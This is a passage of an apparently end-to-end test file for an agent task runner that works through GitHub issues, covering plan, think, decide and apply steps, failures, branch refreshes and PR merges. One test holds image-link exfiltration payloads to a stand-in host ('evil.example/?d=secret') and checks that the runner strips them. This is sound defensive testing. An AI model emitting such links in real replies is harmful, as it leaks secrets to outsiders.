// A run end to end (ADR 0031): plan → think → decide → apply, as task.yml's run job calls them, in
// this process, against the fake gh (tests/fixtures/fake-gh.mjs) and a stand-in agent
// (tests/fixtures/fake-thinker.mjs) started through the real adapter, off a box. What the owner
// sees is the record: the replies with their hidden lines, the status, the labels.

import { type ChildProcess, execFileSync, spawn, spawnSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { createServer } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { workspace } from "../cli/commands/task/context.ts";
import { keepRecipes, taskDue } from "../cli/commands/task/due.ts";
import { fromLine, readReply } from "../cli/contracts/index.ts";
import { readTaskSeen } from "../cli/contracts/watch.ts";
import { apply } from "../cli/kernel/apply.ts";
import { tellDoor } from "../cli/kernel/door.ts";
import {
  runApply,
  runDecide,
  runFailed,
  runFinishStep,
  runGithub,
  runPlan,
  runStay,
  runStep,
  runTask,
  runThinkStep,
} from "../cli/kernel/run.ts";
import type { Result } from "../cli/lib/output.ts";
import { StatusIssueState, setUpcoming } from "../cli/lib/status-issue.ts";
import { findStatus, newState, renderStatus, type TaskState } from "../cli/lib/task.ts";
import { ROOT, sandbox } from "./helpers.ts";

interface Fake {
  repo: string;
  bot: string;
  nextId: number;
  issue: {
    number: number;
    title: string;
    body: string;
    state: string;
    labels: { name: string }[];
    user: { login: string };
  };
  comments: {
    id: number;
    body: string;
    user: { login: string };
    created_at: string;
    updated_at?: string;
  }[];
  others: Record<string, unknown>;
  calls: string[];
  prs?: Record<string, unknown>;
  closer?: string;
  files?: Record<string, string>;
  commitStatus?: Record<string, unknown>;
  /** The run's own jobs and steps, as GitHub lists them. */
  jobs?: { name: string; steps: { name: string; conclusion: string | null }[] }[];
}

const saved = { ...process.env };
let file = "";
let outputs = "";
let jots = "";
/** The project's "GitHub": git's own server on this machine, as apply refuses local files. */
let daemon: ChildProcess | undefined;
const made = () =>
  existsSync(jots) ? readFileSync(jots, "utf8").trim().split("\n").filter(Boolean) : [];
const read = (): Fake => JSON.parse(readFileSync(file, "utf8"));
const set = (change: (f: Fake) => void) => {
  const f = read();
  change(f);
  writeFileSync(file, JSON.stringify(f));
};
const say = (body: string, login = "owner") =>
  set((f) => {
    f.comments.push({
      id: f.nextId++,
      body,
      user: { login },
      created_at: new Date().toISOString(),
    });
  });
const replies = () =>
  read()
    .comments.map((c) => ({ c, line: readReply(c.body) }))
    .filter((x) => x.line);
const status = () => findStatus(read().comments as never).state;
const out = (name: string) =>
  new RegExp(`^${name}=(.*)$`, "m").exec(readFileSync(outputs, "utf8"))?.[1];

/** Waits for what a running stay does, reading the fake's state as it goes. */
const until = async (done: () => boolean) => {
  // The fake's state is rewritten whole by each gh the stay starts: a read mid-write retries.
  const now = () => {
    try {
      return done();
    } catch {
      return false;
    }
  };
  for (let i = 0; i < 300 && !now(); i++) await new Promise((r) => setTimeout(r, 100));
  expect(now()).toBe(true);
};
/** Your words while a stay runs: under the fake gh's own lock, so neither loses the other's. */
const sayNow = async (body: string) => {
  for (;;) {
    try {
      mkdirSync(`${file}.lock`);
      break;
    } catch {
      await new Promise((r) => setTimeout(r, 5));
    }
  }
  try {
    say(body);
  } finally {
    rmSync(`${file}.lock`, { recursive: true, force: true });
  }
};

/** One run of the job: its steps in order, each as task.yml calls it. */
/** The CLI built as one file (ADR 0051 B1): set, `job` starts each step from it as a box does. */
let built: string | undefined;

/** One step: here, or from the built file in a process of its own, with this test's environment. */
async function step(name: string, here: () => Promise<Result>): Promise<Result> {
  if (!built) return here();
  const r = spawnSync(process.execPath, [built, "run", name, "12", "--json"], {
    cwd: ROOT,
    env: process.env,
    encoding: "utf8",
    timeout: 60_000,
  });
  const at = r.stdout.lastIndexOf('{\n  "command"');
  if (at < 0) throw new Error(`${name} from the built CLI: ${r.stdout}${r.stderr}`);
  return JSON.parse(r.stdout.slice(at)) as Result;
}

async function job(event: string, action = "", meanwhile?: () => void) {
  Object.assign(process.env, {
    EVENT: event,
    ACTION: action,
    GITHUB_RUN_ID: String(Date.now()),
  });
  writeFileSync(outputs, "");
  // The task step first, as task.yml runs it: plan carries on from its read (ADR 0045).
  await step("task", () => runTask(12));
  const plan = await step("plan", () => runPlan(12));
  const think = out("do") === "think" ? await step("think", () => runThinkStep(12)) : undefined;
  // What happens on GitHub while the agent works (a sibling's PR merged into main).
  meanwhile?.();
  // The finish (ADR 0059): after a work run's think, before decide, as task.yml runs it.
  const finish =
    think?.status === "succeeded" && out("profile") === "work"
      ? await step("finish", () => runFinishStep(12))
      : undefined;
  const decide = await step("decide", () => runDecide(12));
  const apply = await step("apply", () => runApply(12));
  return { plan, think, finish, decide, apply, do: out("do") };
}

beforeEach(() => {
  const sb = sandbox();
  const dir = mkdtempSync(join(tmpdir(), "flow-"));
  symlinkSync(join(ROOT, "tests/fixtures/fake-gh.mjs"), join(dir, "gh"));
  file = join(dir, "gh.json");
  outputs = join(dir, "outputs");
  writeFileSync(
    file,
    JSON.stringify({
      repo: "o/shipify",
      bot: "github-actions[bot]",
      nextId: 100,
      issue: {
        number: 12,
        title: "how much disk is free?",
        body: "",
        state: "open",
        labels: [],
        user: { login: "owner" },
      },
      comments: [],
      others: {},
      calls: [],
    } satisfies Fake),
  );
  // The agent: Claude Code's adapter, with the stand-in as its command.
  const executors = JSON.parse(readFileSync(join(ROOT, "executors.json"), "utf8"));
  executors.claude.task = [process.execPath, join(ROOT, "tests/fixtures/fake-thinker.mjs")];
  writeFileSync(join(dir, "executors.json"), JSON.stringify(executors));
  writeFileSync(
    join(dir, "tools.json"),
    JSON.stringify({
      version: 1,
      jot: {
        description: "A list of jots",
        run: [process.execPath, join(ROOT, "tests/fixtures/fake-mcp.mjs")],
        keys: { JOT_LOG: { look: "SHIPIFY_JOT_READ", act: "SHIPIFY_JOT_WRITE" } },
        look: ["list"],
        act: ["add"],
      },
    }),
  );
  jots = join(dir, "jots.jsonl");
  process.env = {
    ...saved,
    ...sb.env,
    PATH: `${dir}:${saved.PATH}`,
    FAKE_GH_STATE: file,
    GITHUB_REPOSITORY: "o/shipify",
    GITHUB_OUTPUT: outputs,
    SHIPIFY_OWNER: "owner",
    SHIPIFY_DOOR_SLUG: "shipify-door",
    SHIPIFY_ISSUES_TOKEN: "issues-token",
    SHIPIFY_EXECUTORS_FILE: join(dir, "executors.json"),
    SHIPIFY_TOOLS_FILE: join(dir, "tools.json"),
    FAKE_RESULT: "",
  };
  delete process.env.GITHUB_ACTIONS;
  delete process.env.SHIPIFY_BOX;
});
afterEach(() => {
  daemon?.kill();
  daemon = undefined;
  process.env = { ...saved };
});

const git = (cwd: string, ...args: string[]) =>
  execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });

/** A project's manifest: an app, no releases (so its checks need no version bump). */
const DEMO = JSON.stringify({
  shipify: 1,
  id: "demo",
  name: "Demo",
  description: "x",
  kind: "app",
  version: "1.0.0",
  releases: false,
  stack: { id: "ts-static", version: "1.5.0" },
  preset: null,
  staging: false,
  service: null,
  repository: { visibility: "private", url: "https://github.com/o/demo" },
  urls: { production: "https://demo.example.com" },
  health: "/health",
  secrets: { deploy: [], runtime: [] },
  vars: [],
  platformVersion: "0.2.0",
  createdAt: "2026-10-05T00:00:00.000Z",
});

/** A free port on this machine. */
const freePort = () =>
  new Promise<number>((done) => {
    const srv = createServer().listen(0, "127.0.0.1", () => {
      const port = (srv.address() as { port: number }).port;
      srv.close(() => done(port));
    });
  });

/**
 * A project the way a box run meets it: "demo" in the registry, its repo on "GitHub" (a bare repo
 * served by git's own server, which the agent's clone and apply's push both reach through git's
 * insteadOf), and the write token apply is minted. Returns the remote, and the task is titled for it.
 */
async function onProject(): Promise<string> {
  const dir = dirname(file);
  const origin = join(dir, "o", "demo.git");
  git(dir, "init", "-q", "--bare", "-b", "main", origin);
  // Partial clones, as GitHub serves them (apply's is blobless, ADR 0044): without these, git's
  // server ignores the filter and sends everything, and a test would never see a lazy fetch.
  git(origin, "config", "uploadpack.allowFilter", "true");
  git(origin, "config", "uploadpack.allowAnySHA1InWant", "true");
  const seed = join(dir, "seed");
  git(dir, "clone", "-q", origin, seed);
  writeFileSync(join(seed, "shipify.json"), DEMO);
  writeFileSync(join(seed, "Makefile"), "setup:\n\t@true\nverify:\n\t@true\n");
  git(seed, "add", "-A");
  git(seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "first");
  git(seed, "push", "-q", "origin", "main");
  writeFileSync(
    process.env.SHIPIFY_REGISTRY_FILE as string,
    JSON.stringify({
      schemaVersion: 1,
      projects: [
        {
          id: "demo",
          kind: "app",
          path: "../projects/demo",
          repository: "https://github.com/o/demo",
          visibility: "private",
          stack: "ts-static@1.5.0",
          preset: null,
          staging: false,
          urls: {},
          registeredAt: "2026-10-05T00:00:00.000Z",
        },
      ],
    }),
  );
  const port = await freePort();
  daemon = spawn(
    "git",
    [
      "daemon",
      "--reuseaddr",
      "--export-all",
      "--enable=receive-pack",
      `--base-path=${join(dir, "o")}`,
      "--listen=127.0.0.1",
      `--port=${port}`,
      join(dir, "o"),
    ],
    { stdio: "ignore" },
  );
  const url = `git://127.0.0.1:${port}/`;
  for (let i = 0; i < 50; i++) {
    try {
      git(dir, "ls-remote", `${url}demo.git`);
      break;
    } catch {
      await new Promise((r) => setTimeout(r, 100));
    }
  }
  // github.com/o/ maps to that server in one git config file: the agent's clone reads it through
  // GIT_CONFIG_GLOBAL (its sandbox has a HOME of its own, and its key takes GIT_CONFIG_*), and
  // apply through this run's HOME, the one thing besides PATH it hands git.
  const home = join(dir, "home");
  mkdirSync(home, { recursive: true });
  writeFileSync(join(home, ".gitconfig"), `[url "${url}"]\n\tinsteadOf = https://github.com/o/\n`);
  Object.assign(process.env, {
    HOME: home,
    GIT_CONFIG_GLOBAL: join(home, ".gitconfig"),
    SHIPIFY_WRITE_TOKEN: "write-token",
  });
  set((f) => {
    f.issue.title = "demo: a bigger font";
  });
  return origin;
}
/** A commit on the project's main, as a sibling task's merged PR makes it. */
function onMain(origin: string, name: string, text: string) {
  const sib = join(dirname(file), `sibling-${Date.now()}`);
  git(dirname(file), "clone", "-q", origin, sib);
  writeFileSync(join(sib, name), text);
  git(sib, "add", "-A");
  git(sib, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", `Sibling: ${name}`);
  git(sib, "push", "-q", "origin", "main");
}
const branches = (origin: string) =>
  git(origin, "for-each-ref", "--format=%(refname:short)", "refs/heads").trim().split("\n");
const lastReply = () => replies().at(-1);

describe("a step that breaks is named in the reply (#174)", () => {
  it("plan decided, then couldn't hand its outputs on: the reply says which step and why", async () => {
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "77" });
    // Its outputs file can't be written: plan breaks after saving its decision, as #174's did.
    process.env.GITHUB_OUTPUT = join(dirname(file), "no-such-dir", "outputs");
    await expect(runStep("plan", 12)).rejects.toThrow();
    await runFailed(12);
    const p = status()?.failed?.problem;
    expect(p?.code).toBe("step-failed");
    expect(p?.what).toMatch(/^The run's plan step failed: /);
    expect(replies().at(-1)?.c.body).toContain("The run's plan step failed");
    // Another run's breakage, or another attempt of this one (a re-run keeps the run's id), is
    // never said as this one's.
    process.env.GITHUB_RUN_ATTEMPT = "2";
    await runFailed(12);
    expect(status()?.failed?.problem.code).toBe("unexpected");
  });

  it("a step of the workflow's own broke (GitHub wouldn't mint the run's key): the reply names it", async () => {
    Object.assign(process.env, {
      EVENT: "issue_comment",
      GITHUB_RUN_ID: "88",
      GITHUB_RUN_ATTEMPT: "1",
      GITHUB_JOB: "run",
    });
    set((f) => {
      f.jobs = [
        {
          name: "run",
          steps: [
            { name: "Set up job", conclusion: "success" },
            { name: "A read-only token for plan (every project; one hour)", conclusion: "failure" },
            { name: "If the run broke before it answered, say so on the task", conclusion: null },
          ],
        },
      ];
    });
    await runFailed(12);
    const p = status()?.failed?.problem;
    expect(p?.code).toBe("step-failed");
    expect(p?.what).toContain("A read-only token for plan (every project; one hour)");
    expect(lastReply()?.c.body).toContain("A read-only token for plan");
  });

  it("a run that broke before its plan reads the task fresh: never an earlier run's plan (#231)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say("and the Pi?");
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "3 GB there." });
    await job("issue_comment", "created");
    const answered = status();
    // The next run's key couldn't be minted (GitHub's 500s), so its plan never ran: the workspace
    // still holds the last run's plan.
    Object.assign(process.env, { EVENT: "issue_comment", ACTION: "created", GITHUB_RUN_ID: "999" });
    await runFailed(12);
    expect(lastReply()?.line?.kind).toBe("failed");
    const now = status();
    expect(now.phase).toBe("failed");
    // Nothing rolled back: the words the last run answered stay read, its answer stays before this.
    expect(now.seen).toBe(answered.seen);
    expect(now.cursor?.id).toBe(answered.seen);
    expect(now.reply ?? 0).toBeGreaterThan(answered.reply ?? 0);
    // The run that broke is the one linked.
    expect(now.failed?.problem.where).toMatch(/\/actions\/runs\/999$/);
  });

  it("a task's first run that broke before its plan still says so", async () => {
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "5" });
    const r = await runFailed(12);
    expect(r.status).toBe("succeeded");
    expect(lastReply()?.line?.kind).toBe("failed");
    expect(status().phase).toBe("failed");
  });
});

describe("telling the door of a reply", () => {
  it("sends each file with its type, so a picture shows as one (ADR 0042)", async () => {
    const dir = mkdtempSync(join(tmpdir(), "made-"));
    const files = ["chart.PNG", "notes.md", "data.bin"].map((f) => {
      writeFileSync(join(dir, f), "x");
      return join(dir, f);
    });
    Object.assign(process.env, {
      SHIPIFY_DOOR_URL: "https://door.example.com/door",
      ACTIONS_ID_TOKEN_REQUEST_URL: "https://token.example.com/?v=1",
      ACTIONS_ID_TOKEN_REQUEST_TOKEN: "t",
    });
    let sent: FormData | undefined;
    vi.stubGlobal("fetch", async (url: string, init?: RequestInit) => {
      if (url.startsWith("https://token.example.com")) return Response.json({ value: "oidc" });
      sent = init?.body as FormData;
      return Response.json({});
    });
    try {
      await tellDoor(12, 100, files);
    } finally {
      vi.unstubAllGlobals();
    }
    expect(((sent?.getAll("file") ?? []) as File[]).map((f) => [f.name, f.type])).toEqual([
      ["chart.PNG", "image/png"],
      ["notes.md", "text/markdown"],
      ["data.bin", "application/octet-stream"],
    ]);
  });
});

describe("apply when GitHub refuses a write", () => {
  it("never skips the status: its labels right, and each reply written told to the door (#231)", async () => {
    const labels = () => read().issue.labels.map((l) => l.name);
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "41" });
    writeFileSync(outputs, "");
    await runPlan(12);
    expect(labels()).toContain("working");
    const { s, p } = JSON.parse(
      readFileSync(join(workspace(), ".tasks", "12", "plan.json"), "utf8"),
    );
    // GitHub takes one more comment, then answers 500; the run it starts fails too, so its failure
    // needs a reply of its own, which GitHub refuses.
    set((f) => Object.assign(f, { commentsLeft: 1, noDispatch: true }));
    const told: number[] = [];
    const done = await apply(
      s,
      p.state,
      [
        { w: "reply", kind: "answer", state: "Done", text: "About 12 GB free.", step: "think-new" },
        { w: "dispatch", job: "run" },
      ],
      { defaults: [], tokens: {}, tellDoor: async (_, c) => void told.push(c) },
    );
    expect(done.replies).toHaveLength(1);
    expect(told).toEqual(done.replies);
    expect(status().phase).toBe("failed");
    expect(labels()).not.toContain("working");
    expect(labels()).toContain("failed");
    // Its problem reached no reply: the job fails, so the failure step tells it.
    expect(done.told).toBe(false);
  });

  it("tells the door of a reply as soon as it's written, before the writes after it (ADR 0057)", async () => {
    const labels = () => read().issue.labels.map((l) => l.name);
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "42" });
    writeFileSync(outputs, "");
    await runPlan(12);
    const { s, p } = JSON.parse(
      readFileSync(join(workspace(), ".tasks", "12", "plan.json"), "utf8"),
    );
    const seen: string[][] = [];
    const done = await apply(
      s,
      p.state,
      [
        { w: "reply", kind: "answer", state: "Done", text: "About 12 GB free.", step: "think-new" },
        { w: "labels", add: ["later"] },
      ],
      { defaults: [], tokens: {}, tellDoor: async () => void seen.push(labels()) },
    );
    expect(done.replies).toHaveLength(1);
    // Told once, while the label written after the reply wasn't there yet.
    expect(seen).toHaveLength(1);
    expect(seen[0]).not.toContain("later");
    expect(labels()).toContain("later");
  });

  it("a reply from a run that read outside content posts no image, in any field (ADR 0044)", async () => {
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "43" });
    writeFileSync(outputs, "");
    await runPlan(12);
    const { s, p } = JSON.parse(
      readFileSync(join(workspace(), ".tasks", "12", "plan.json"), "utf8"),
    );
    await apply(
      s,
      p.state,
      [
        {
          w: "reply",
          kind: "needs-you",
          state: "Needs you",
          text: 'It counts words. ![x](https://evil.example/?d=secret) <img src="https://evil.example/p">',
          question: "Look ![q](https://evil.example/q)?",
          choices: ["![c](https://evil.example/c)"],
          step: "think-new",
          outside: true,
        },
      ],
      { defaults: [], tokens: {}, tellDoor: async () => {} },
    );
    const body = lastReply()?.c.body ?? "";
    expect(body).toContain("It counts words.");
    expect(body).not.toMatch(/(^|[^\\])!\[|<img/);
    expect(body).toContain("&lt;img");
  });

  it("a reply GitHub refused keeps its words: the next reply carries them with the problem", async () => {
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "42" });
    writeFileSync(outputs, "");
    await runPlan(12);
    const { s, p } = JSON.parse(
      readFileSync(join(workspace(), ".tasks", "12", "plan.json"), "utf8"),
    );
    set((f) => Object.assign(f, { commentsFail: 1 }));
    const done = await apply(
      s,
      p.state,
      [{ w: "reply", kind: "answer", state: "Done", text: "About 12 GB free.", step: "think-new" }],
      { defaults: [], tokens: {}, tellDoor: async () => {} },
    );
    expect(done.told).toBe(true);
    const body = lastReply()?.c.body ?? "";
    expect(body).toContain("502");
    expect(body).toContain("About 12 GB free.");
  });
});

// Two whole runs, kept as functions: each runs here and again from the built CLI (ADR 0051 B1).
async function aChange() {
  const origin = await onProject();
  process.env.FAKE_WORK = "ok";
  const r = await job("issues", "opened");
  expect(r.do).toBe("think");
  expect(out("profile")).toBe("work");
  expect(out("repos")).toBe("demo,shipify");
  expect(out("repo")).toBe("demo");
  expect(r.apply.status).toBe("succeeded");
  const branch = branches(origin).find((b) => b.startsWith("task/12-"));
  expect(branch).toBeTruthy();
  expect(read().prs).toEqual({ "https://github.com/o/demo/pull/1": "OPEN" });
  expect(lastReply()?.line).toMatchObject({ kind: "needs-you" });
  expect(lastReply()?.c.body).toContain("https://github.com/o/demo/pull/1");
  expect(status()?.prs).toEqual(["https://github.com/o/demo/pull/1"]);
  // A whole job: about 40 seconds on a Raspberry Pi box, more while its other slots work.
}

async function neverTwice() {
  process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
  await job("issues", "opened");
  const again = await job("issues", "edited");
  expect(again.do).toBe("nothing");
  // A repeated apply (a re-run of the job) finds its reply already written.
  await step("apply", () => runApply(12));
  expect(replies()).toHaveLength(1);
}

describe("a task on a project, end to end, as a box runs it (ADR 0035)", () => {
  it(
    "a change: plan names its repos, the agent commits, the box checks, apply opens the PR on the task's branch",
    aChange,
    90_000,
  );

  it("main moved while the agent worked: the finish brings the branch up to date and checks it again, and the PR opens from it (ADR 0059)", async () => {
    const origin = await onProject();
    process.env.FAKE_WORK = "ok";
    const r = await job("issues", "opened", () =>
      onMain(origin, "sibling.txt", "merged meanwhile\n"),
    );
    expect(r.finish?.summary).toContain("brought the branch up to date");
    expect(r.apply.status).toBe("succeeded");
    const branch = branches(origin).find((b) => b.startsWith("task/12-")) as string;
    const files = git(origin, "ls-tree", "-r", "--name-only", branch);
    expect(files).toContain("sibling.txt");
    expect(files).toContain("change.txt");
    expect(git(origin, "merge-base", "--is-ancestor", "main", branch)).toBe("");
    expect(read().prs).toEqual({ "https://github.com/o/demo/pull/1": "OPEN" });
    expect(lastReply()?.c.body).toContain("brought the branch up to date");
    // A job and a refresh (`ship refresh`: a merge and `make version` twice): about 50 s on a
    // Raspberry Pi box, over 90 while its other slots run their own checks.
  }, 180_000);

  it("main moved and conflicts: the PR opens as the agent left it, and the reply says `continue` brings it up to date (ADR 0059)", async () => {
    const origin = await onProject();
    process.env.FAKE_WORK = "ok";
    const r = await job("issues", "opened", () => onMain(origin, "change.txt", "theirs\n"));
    expect(r.finish?.summary).toContain("refreshing the branch stopped");
    const branch = branches(origin).find((b) => b.startsWith("task/12-")) as string;
    expect(git(origin, "show", `${branch}:change.txt`)).toBe("x\n");
    expect(git(origin, "log", "--format=%s", branch)).not.toContain("Merge");
    expect(read().prs).toEqual({ "https://github.com/o/demo/pull/1": "OPEN" });
    expect(lastReply()?.c.body).toContain("reply `continue`");
    // A job and a refresh that stops, as above.
  }, 180_000);

  it("stays after its PR opens; a change asked of the stay goes to a work run (ADR 0060)", async () => {
    await onProject();
    process.env.FAKE_WORK = "ok";
    await job("issues", "opened");
    expect(read().prs).toEqual({ "https://github.com/o/demo/pull/1": "OPEN" });
    expect(out("stay")).toBe("yes");
    expect(read().issue.labels.map((l) => l.name)).toContain("staying");
    // The stay's turn, in the same session and clone: it changes nothing, and hands the change on.
    delete process.env.FAKE_WORK;
    process.env.FAKE_FINAL = JSON.stringify({
      v: 2,
      state: "done",
      text: "I'll make it green.",
      work: { project: "demo", brief: "Make it green" },
    });
    try {
      say("make it green");
      const done = await runStay(12);
      expect(done.summary).toContain("1 answer; left: its answer started more work");
      const prompt = readFileSync(
        join(workspace(), ".tasks", "12", "agent", "out", "next-prompt.md"),
        "utf8",
      );
      expect(prompt).toContain("This turn comes from a stay, which pushes nothing");
      expect(lastReply()?.c.body).toContain("A work run on demo starts now");
      expect(read().calls).toContain("workflow run task.yml -R o/shipify -f issue=12 -f job=run");
      expect(read().issue.labels.map((l) => l.name)).not.toContain("staying");
    } finally {
      delete process.env.FAKE_FINAL;
    }
  }, 120_000);

  it("a stay's question on a project sends only its own commits: none, so it stays (ADR 0063)", async () => {
    const origin = await onProject();
    // A question mid-change: its commits are kept on the task's branch before the stay.
    process.env.FAKE_WORK = "question";
    await job("issues", "opened");
    expect(branches(origin).some((b) => b.startsWith("task/12-"))).toBe(true);
    expect(out("stay")).toBe("yes");
    delete process.env.FAKE_WORK;
    process.env.FAKE_FINAL = JSON.stringify({
      v: 2,
      state: "needs-you",
      text: "Green or blue?",
      question: "Green or blue?",
    });
    try {
      say("what colour should the button be?");
      writeFileSync(outputs, "");
      const staying = runStay(12);
      // The run's own commits were pushed before the stay: this question needs no push, no key.
      await until(() => lastReply()?.c.body.includes("Green or blue?") ?? false);
      expect(read().issue.labels.map((l) => l.name)).toContain("staying");
      await sayNow("start over");
      const done = await staying;
      expect(done.summary).toContain("1 answer; left: words for a normal run");
      expect(out("apply")).toBeUndefined();
    } finally {
      delete process.env.FAKE_FINAL;
    }
  }, 120_000);

  it("main didn't move: the finish fetches and changes nothing (ADR 0059)", async () => {
    await onProject();
    process.env.FAKE_WORK = "ok";
    const r = await job("issues", "opened");
    expect(r.finish?.summary).toBe("task #12: up to date with main");
    expect(lastReply()?.c.body).not.toContain("Main moved");
  }, 90_000);

  it("a run that stops early keeps its work on the branch, and `continue` opens the PR from it", async () => {
    const origin = await onProject();
    process.env.FAKE_WORK = "crash";
    const first = await job("issues", "opened");
    expect(first.apply.status).toBe("succeeded");
    expect(status()?.failed?.problem.code).toBe("agent-stopped");
    expect(lastReply()?.c.body).toContain("it crashed (exit 1)");
    const branch = branches(origin).find((b) => b.startsWith("task/12-")) as string;
    expect(git(origin, "log", "--format=%s", branch).split("\n")[0]).toBe(
      "Work in progress: it crashed (exit 1)",
    );
    expect(read().prs ?? {}).toEqual({});
    say("continue");
    process.env.FAKE_WORK = "ok";
    const next = await job("issue_comment", "created");
    expect(next.do).toBe("think");
    expect(read().prs).toEqual({ "https://github.com/o/demo/pull/1": "OPEN" });
    // The PR carries on from the kept commits.
    expect(git(origin, "log", "--format=%s", branch)).toContain("Work in progress: it crashed");
    // Two whole jobs: each takes about 40 seconds on a Raspberry Pi box, over 80 while its other
    // slots run their own checks (the box's verify took 159 s here): the clock leaves room for that.
  }, 300_000);

  it("a question mid-change keeps its work on the branch, its reply as any question's (ADR 0041)", async () => {
    const origin = await onProject();
    process.env.FAKE_WORK = "question";
    const first = await job("issues", "opened");
    expect(first.apply.status).toBe("succeeded");
    // One reply, the question's, with nothing about the kept commits.
    expect(replies()).toHaveLength(1);
    expect(lastReply()?.line).toMatchObject({ kind: "needs-you" });
    expect(lastReply()?.c.body).toContain("Which colour?");
    expect(lastReply()?.c.body).toContain("Blue or green?");
    expect(lastReply()?.c.body).not.toMatch(/kept|continue/);
    expect(status()?.phase).toBe("needs-you");
    const branch = branches(origin).find((b) => b.startsWith("task/12-")) as string;
    expect(git(origin, "log", "--format=%s", branch).split("\n")[0]).toBe(
      "Work in progress: waiting on your answer",
    );
    // The edit it hadn't committed too: your answer's run starts from all of it (as after a stop).
    expect(git(origin, "ls-tree", "-r", "--name-only", branch)).toContain("draft.txt");
  }, 90_000);

  it("a question whose kept work can't be pushed is still the question: the push is in the run's log only (ADR 0041)", async () => {
    const origin = await onProject();
    process.env.FAKE_WORK = "question-workflow";
    const first = await job("issues", "opened");
    expect(first.apply.status).toBe("succeeded");
    expect(replies()).toHaveLength(1);
    expect(lastReply()?.line).toMatchObject({ kind: "needs-you" });
    expect(lastReply()?.c.body).toContain("Blue or green?");
    expect(lastReply()?.c.body).not.toContain("went wrong");
    expect(status()?.phase).toBe("needs-you");
    expect(branches(origin).some((b) => b.startsWith("task/12-"))).toBe(false);
  }, 90_000);

  it("a job re-run after it died inside a question's kept push: the question, nothing about the push (ADR 0041)", async () => {
    await onProject();
    process.env.FAKE_WORK = "question";
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "500" });
    writeFileSync(outputs, "");
    await runPlan(12);
    await runThinkStep(12);
    await runDecide(12);
    // The push's line in the journal, not finished: the job died inside it, and was re-run.
    const decided = join(workspace(), ".tasks", "12", "decided.json");
    const d = JSON.parse(readFileSync(decided, "utf8"));
    const push = d.writes.find((w: { w: string }) => w.w === "push");
    expect(push).toMatchObject({ open: false, quiet: true });
    expect(out("keep")).toBe("quiet");
    d.state.journal = [
      {
        key: `push:${push.repo}:${push.branch}:500`,
        what: `pushing ${push.branch}`,
        at: "2026-10-07T00:00:00.000Z",
      },
    ];
    writeFileSync(decided, JSON.stringify(d));
    await runApply(12);
    expect(replies()).toHaveLength(1);
    expect(lastReply()?.c.body).toContain("Blue or green?");
    expect(lastReply()?.c.body).not.toContain("earlier run");
  }, 90_000);

  it("a PR opened from the PC that closes the task: GitHub names it, and the run still says Live", async () => {
    await onProject();
    const sha = "b".repeat(40);
    const url = "https://github.com/o/demo/pull/7";
    set((f) => {
      // Never in the task's state: `ship pr --task 12` linked it by its body alone.
      f.closer = url;
      f.prs = {
        [url]: {
          state: "MERGED",
          baseRefName: "main",
          mergeCommit: { oid: sha },
          mergedAt: new Date().toISOString(),
        },
      };
      f.files = { "o/demo/shipify.json": DEMO };
      f.commitStatus = {
        [`repos/o/demo/commits/${sha}/status`]: [{ context: "shipify/main", state: "success" }],
      };
      f.issue.state = "closed";
    });
    const r = await job("issues", "closed");
    expect(r.apply.status).toBe("succeeded");
    expect(lastReply()?.c.body).toContain("Live:** demo at https://demo.example.com");
    expect(status()?.project).toBe("demo");
  }, 60_000);

  it("the merge: its own run follows the deploy and says Live", async () => {
    await onProject();
    process.env.FAKE_WORK = "ok";
    await job("issues", "opened");
    const sha = "a".repeat(40);
    set((f) => {
      f.prs = {
        "https://github.com/o/demo/pull/1": {
          state: "MERGED",
          baseRefName: "main",
          mergeCommit: { oid: sha },
          mergedAt: new Date().toISOString(),
        },
      };
      f.files = { "o/demo/shipify.json": DEMO };
      f.commitStatus = {
        [`repos/o/demo/commits/${sha}/status`]: [{ context: "shipify/main", state: "success" }],
      };
      f.issue.state = "closed";
    });
    const r = await job("issues", "closed");
    expect(r.apply.status).toBe("succeeded");
    expect(lastReply()?.c.body).toContain("Live");
    expect(lastReply()?.c.body).toContain("https://demo.example.com");
  }, 90_000);
});

describe("a run end to end", () => {
  it("answers a question: one reply with its hidden line, the status saved, 👀 on what it read", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    const r = await job("issues", "opened");
    expect(r.do).toBe("think");
    expect(r.apply.status).toBe("succeeded");
    const [first, ...more] = replies();
    expect(more).toEqual([]);
    expect(first?.c.body).toContain("About 12 GB free.");
    expect(first?.line).toMatchObject({ kind: "answer", title: "how much disk is free?" });
    // 👀 on the task itself: its own words were read, as each comment's are.
    expect(
      read().calls.some((c: string) => c.includes("repos/o/shipify/issues/12/reactions")),
    ).toBe(true);
    expect(status().phase).not.toBe("working");
    expect(status().bodyHash).toBeTruthy();
    // What the edge's watch reads (contracts/watch.ts): no run under way, and a cursor.
    const line = read().comments.find((c) => c.body.startsWith("<!-- shipify-task "))?.body;
    const seen = readTaskSeen(line);
    expect(seen?.working).toBeUndefined();
    expect(seen?.cursor).toMatchObject({ id: 0 });
  });

  it("each step stays inside its call budget, and plan and apply never re-read the issue (ADR 0051 B0, B2)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "77" });
